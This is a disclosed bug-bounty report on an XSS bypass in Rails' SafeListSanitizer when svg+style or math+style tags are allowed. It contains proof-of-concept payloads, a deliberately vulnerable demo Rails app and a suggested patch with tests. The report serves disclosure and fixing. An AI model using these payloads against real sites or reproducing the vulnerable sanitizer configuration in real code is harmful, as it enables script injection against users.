# Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)

## Report Details
- **Report ID**: 1656627
- **URL**: https://hackerone.com/reports/1656627
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-08-01T21:28:55.174Z
- **Disclosed**: 2022-12-14T22:41:10.444Z

## Reporter
- **Username**: 0b5cur17y
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
## Intro

The Rails HTML sanitzier allows to set certain combinations of tags in it's allow list that are not properly handled. 
Similar to the report [1530898](https://hackerone.com/reports/1530898), which identified the combination`select` and `style` as vulnerable,
my fuzz testing from today suggests that also `svg` and `style` as well as `math` and `style` allow XSS.
The following are PoCs for each of these allow list:
- `svg` and `style`: `<svg><style><script>alert(1)</script></style></svg>`
- `math` and `style`: `<math><style><img src=x onerror=alert(1)></style></math>`

See the following IRB session: 
```
irb(main):016:0> require 'rails-html-sanitizer'
=> false
irb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>", tags: ["svg", "style"]).to_s
=> "<svg><style><script>alert(1)</script></style></svg>"
irb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
=> "<math><style><img src=x onerror=alert(1)></style></math>"
irb(main):019:0> puts Rails::Html::Sanitizer::VERSION
1.4.3
=> nil 
```

## Sample Vulnerable Rails Application

To build a sample rails application that is vulnerable, I've used the following `Dockerfile`:

```
FROM ruby:3.1.2

RUN apt-get update && apt-get install -y vim

WORKDIR /usr/src/app
RUN gem install rails && rails new myapp
WORKDIR /usr/src/app/myapp


COPY build-rails-app.sh ./build-rails-app.sh
RUN sh ./build-rails-app.sh
RUN RAILS_ENV=production rails assets:precompile

CMD ["./bin/rails", "server", "-b", "0.0.0.0", "-e", "production"]
```

In the same directory, put a shell script `build-rails-app.sh` which writes the app:

```
#!/ibn/sh

# make routes
cat << EOF > ./config/routes.rb
Rails.application.routes.draw do
  get "/poc1", to: "poc1#index"
  get "/poc2", to: "poc2#index"
end
EOF

# make Poc1 endpoint
# http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E
bin/rails generate controller Poc1 index --skip-routes

cat << EOF > ./app/controllers/poc1_controller.rb
class Poc1Controller < ApplicationController
  def index
    @name = params[:name] || "put your name here"
  end
end
EOF


cat << EOF > ./app/views/poc1/index.html.erb
<h1> Hello <%= sanitize @name, tags: ["svg", "style"] %> </h1>
<br>
PoC with a sanitized, reflected parameter 'name' for which 'svg' annd 'style' tags are allowed.
<br>
<%= link_to "Go to PoC", "/poc1?name=<svg><style><script>alert(1)</script></style><svg>" %>
<br>
<br>
Using: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>
EOF


# make Poc2 endpoint
# http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E
bin/rails generate controller Poc2 index --skip-routes

cat << EOF > ./app/controllers/poc2_controller.rb
class Poc2Controller < ApplicationController
  def index
    @name = params[:name] || "put your name here"
  end
end
EOF


cat << EOF > ./app/views/poc2/index.html.erb
<h1> Hello <%= sanitize @name, tags: ["math", "style"] %> </h1>
<br>
PoC with a sanitized, reflected parameter 'name' for which 'math' annd 'style' tags are allowed.
<br>
<%= link_to "Go to PoC", "/poc2?name=<math><style><img src=x onerror=alert(1)></style><math>" %>
<br>
<br>
Using: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>
EOF
```

With the following `Makefile` you can build and run the application

```
.PHONY: build
build:
	docker build -t local/railspoc:latest .

.PHONY: run
run:
	docker run -it --rm -p 127.0.0.1:8888:3000 local/railspoc:latest
```

Now you have a Rails application with two routes `/poc1` and `/poc2` running locally. Visit:
- [http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E](http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E)
- [http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E](http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E)

See the secreenshot attached for what it will roughly look like. Both alerts should be executed.

## Suggestion for Fix

Along the lines of the fix for [1530898](https://hackerone.com/reports/1530898), the following patch could prevent both vectors.
I've just added the two new bad combinations to the check in `remove_safelist_tag_combinations` and adjusted the test to cover all of them too.
In all cases, the `style` tag gets removed from the whitelist, which breaks to PoC:

```
From f78df36644520c57770132a607cedafeec19d796 Mon Sep 17 00:00:00 2001
From: Dominic Breuker <dominic.breuker@protonmail.com>
Date: Mon, 1 Aug 2022 22:57:10 +0200
Subject: [PATCH] disallow safelist combinations of svg+style or math+style

---
 lib/rails/html/sanitizer.rb | 12 ++++++++++--
 test/sanitizer_test.rb      | 35 ++++++++++++++++++++---------------
 2 files changed, 30 insertions(+), 17 deletions(-)

diff --git a/lib/rails/html/sanitizer.rb b/lib/rails/html/sanitizer.rb
index 97503c8..10cd7c4 100644
--- a/lib/rails/html/sanitizer.rb
+++ b/lib/rails/html/sanitizer.rb
@@ -147,13 +147,21 @@ module Rails
       end
 
       def remove_safelist_tag_combinations(tags)
-        if !loofah_using_html5? && tags.include?("select") && tags.include?("style")
-          warn("WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'")
+        if !loofah_using_html5? && dangerous_safelist?(tags)
+          warn("WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select', 'svg' or 'math'")
           tags.delete("style")
         end
         tags
       end
 
+      def dangerous_safelist?(tags)
+        if tags.include?("style")
+          tags.include?("select") || tags.include?("svg") || tags.include?("math")
+        else
+          false
+        end
+      end
+
       def allowed_tags(options)
         if options[:tags]
           remove_safelist_tag_combinations(options[:tags])
diff --git a/test/sanitizer_test.rb b/test/sanitizer_test.rb
index e3ce218..c52eef9 100644
--- a/test/sanitizer_test.rb
+++ b/test/sanitizer_test.rb
@@ -588,22 +588,27 @@ class SanitizersTest < Minitest::Test
   end
 
   def test_disallow_the_dangerous_safelist_combination_of_select_and_style
-    input = "<select><style><script>alert(1)</script></style></select>"
-    tags = ["select", "style"]
-    warning = /WARNING: Rails::Html::SafeListSanitizer: removing 'style' from safelist/
-    sanitized = nil
-    invocation = Proc.new { sanitized = safe_list_sanitize(input, tags: tags) }
-
-    if html5_mode?
-      # if Loofah is using an HTML5 parser,
-      #   then "style" should be removed by the parser as an invalid child of "select"
-      assert_silent(&invocation)
-    else
-      # if Loofah is using an HTML4 parser,
-      #   then SafeListSanitizer should remove "style" from the safelist
-      assert_output(nil, warning, &invocation)
+    tests = {
+      "<select><style><script>alert(1)</script></style></select>" => ["select", "style"],
+      "<svg><style><script>alert(1)</script></style></svg>" => ["svg", "style"],
+      "<math><style><img src=x onerror=alert(1)></style></math>" => ["math", "style"],
+    }
+    tests.each do |input, tags| 
+      warning = /WARNING: Rails::Html::SafeListSanitizer: removing 'style' from safelist/
+      sanitized = nil
+      invocation = Proc.new { sanitized = safe_list_sanitize(input, tags: tags) }
+
+      if html5_mode?
+        # if Loofah is using an HTML5 parser,
+        #   then "style" should be removed by the parser as an invalid child of "select"
+        assert_silent(&invocation)
+      else
+        # if Loofah is using an HTML4 parser,
+        #   then SafeListSanitizer should remove "style" from the safelist
+        assert_output(nil, warning, &invocation)
+      end
+      refute_includes(sanitized, "style")
     end
-    refute_includes(sanitized, "style")
   end
 
 protected
-- 
2.35.1

```

## Impact

It is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.

## Attachments
- rails-sanitizer-xss-pocs-1-2.png
